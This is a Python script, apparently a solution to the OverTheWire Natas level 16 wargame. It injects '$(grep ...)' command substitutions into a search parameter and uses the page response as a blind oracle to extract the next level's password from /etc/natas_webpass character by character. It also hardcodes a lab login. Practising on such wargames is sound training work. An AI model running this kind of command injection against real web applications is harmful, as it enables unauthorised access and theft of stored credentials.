import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup
import requests
from requests.auth import HTTPBasicAuth

# Define the URL and credentials
url = 'http://natas16.natas.labs.overthewire.org/'
username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'

all_letters = [chr(i) for i in range(ord('a'), ord('z') + 1)] + [chr(i) for i in range(ord('A'), ord('Z') + 1)]+[1,2,3,4,5,6,7,8,9,0]
passkey = []
for j in range(1,33):
  print(j)
  for i in all_letters:
    # Define the payload (URL-encoded)
    
    dots = '.'
    times = dots * (j-1)
    payload = f'$(grep ^{times}{i} /etc/natas_webpass/natas17)technology'
    
    # Send the GET request with the payload
    response = requests.get(url, auth=HTTPBasicAuth(username, password), params={'needle': payload})

    # Print the response text
    soup = BeautifulSoup(response.text, 'lxml')
    content_div = soup.find('div', id='content')
    if content_div.get_text(strip=True) != "For security reasons, we now filter even more on certain charactersFind words containing:Output:technology\ntechnology'sView sourcecode":
        print(f"Got {j} character: {i}" )
        passkey.append(str(i))
        break

print("Password is ", ''.join(passkey))